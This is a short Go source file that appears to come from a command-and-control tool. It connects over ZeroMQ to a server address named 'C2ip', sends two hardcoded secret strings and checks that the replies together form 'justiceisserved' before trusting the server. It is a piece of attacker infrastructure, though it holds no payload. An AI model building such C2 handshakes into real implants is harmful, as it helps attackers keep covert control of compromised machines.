package transfer

import (
	"fmt"
	"time"

	zmq "github.com/pebbe/zmq4"
)

const (
	// Dont modify
	SecretInjustice = "injustice"
	SecretIsDone    = "isdone"
	ExpectedResult  = "justiceisserved"
	TimeoutDuration = 5 * time.Second
)

func timeoutcheck(socket *zmq.Socket, secret string) (string, error) {
	resultChan := make(chan string)
	errorChan := make(chan error)

	go func() {
		_, err := socket.SendMessage(secret)
		if err != nil {
			errorChan <- err
			return
		}
		msg, err := socket.RecvMessage(0)
		if err != nil {
			errorChan <- err
			return
		}

		resultChan <- msg[0]
	}()

	select {
	case result := <-resultChan:
		return result, nil
	case err := <-errorChan:
		return "", err
	case <-time.After(TimeoutDuration):
		return "", fmt.Errorf("timeout")
	}
}

func Transfercheck(C2ip, rport string) error {
	dealer, err := zmq.NewSocket(zmq.DEALER)
	dealer.SetLinger(0)
	if err != nil {
		fmt.Println("Failed to start Router socket")
		return err
	}
	defer dealer.Close()

	fmt.Println("Performing verification check on the server")
	err = dealer.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, rport))
	defer dealer.Close()

	if err != nil {
		return err
	}

	message1, err1 := timeoutcheck(dealer, SecretInjustice)
	message2, err2 := timeoutcheck(dealer, SecretIsDone)

	if err1 == nil && err2 == nil {
		result := message1 + message2

		if result == ExpectedResult {
			return nil
		}
	}

	return fmt.Errorf("no mitigation")
}
